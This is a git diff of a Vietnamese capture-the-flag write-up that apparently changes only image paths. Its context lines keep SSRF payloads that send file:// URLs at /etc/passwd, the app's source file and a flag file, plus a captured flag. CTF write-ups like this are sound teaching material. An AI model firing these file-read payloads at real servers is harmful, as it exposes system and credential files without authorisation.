@@ -26,13 +26,13 @@ Nói rõ hơn, giai đoạn mình thực hiện fuzz như sau:
 
 `csrf_token=[token]&url=file://127.0.0.1/etc/passwd&Submit=Go%21`
 
-![](../.gitbook/assets/ảnh.png)
+![](<../.gitbook/assets/ảnh (6).png>)
 
 Để ý server respose header Werkzeug/1.01 Python/3.10.0, tiếp tục fuzz
 
 `csrf_token=[token]&url=file://127.0.0.1/app/main.py&Submit=Go%21`
 
-![](<../.gitbook/assets/ảnh (1).png>)
+![](<../.gitbook/assets/ảnh (7).png>)
 
 `csrf_token=[token]&url=file%3A%2F%2F127.0.0.1%2Fapp%2Fflag.txt&submit=Go%21`
 
@@ -81,7 +81,7 @@ while True:
 //Code tham khảo từ https://kcsc-club.github.io/2021/10/18/svattt2021-quals/#web			
 ```
 
-![](<../.gitbook/assets/ảnh (2).png>)
+![](<../.gitbook/assets/ảnh (9).png>)
 
 Flag: `ASICS{ssalchtiwesmihcueymorf}`
 
